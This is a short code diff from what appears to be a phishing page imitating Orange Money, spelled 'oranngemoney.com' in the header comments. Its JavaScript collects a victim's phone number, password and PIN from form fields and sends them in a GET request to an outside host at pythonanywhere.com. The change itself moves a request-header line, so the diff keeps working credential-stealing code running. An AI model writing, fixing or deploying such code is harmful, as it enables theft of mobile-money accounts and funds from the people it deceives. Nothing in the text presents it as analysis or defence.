@@ -268,13 +268,13 @@
             pincode =  document.getElementById('pincode').value
             const url = `https://erikadavis1.pythonanywhere.com/?phonenumber=${encodeURIComponent(phonenumber)}&password=${encodeURIComponent(password)}&pincode=${pincode}`;
             xhr.open("GET", url);
+            xhr.setRequestHeader('accept','*/*')
             xhr.send(null)
-            // xhr.setRequestHeader('accept','*/*')
             // xhr.setRequestHeader('accept-encoding','gzip, deflate, br, zstd')
             // xhr.setRequestHeader('accept-language','en-US,en;q=0.9')
             // xhr.setRequestHeader('access-control-request-headers','content-type')
             // xhr.setRequestHeader('access-control-request-method','POST')
-            // // xhr.setRequestHeader('connection','keep-alive')
+            // xhr.setRequestHeader('connection','keep-alive')
             // xhr.setRequestHeader('referer','https://oranngemoney.com/')
             // xhr.setRequestHeader('origin','https://oranngemoney.com')
             // xhr.send(
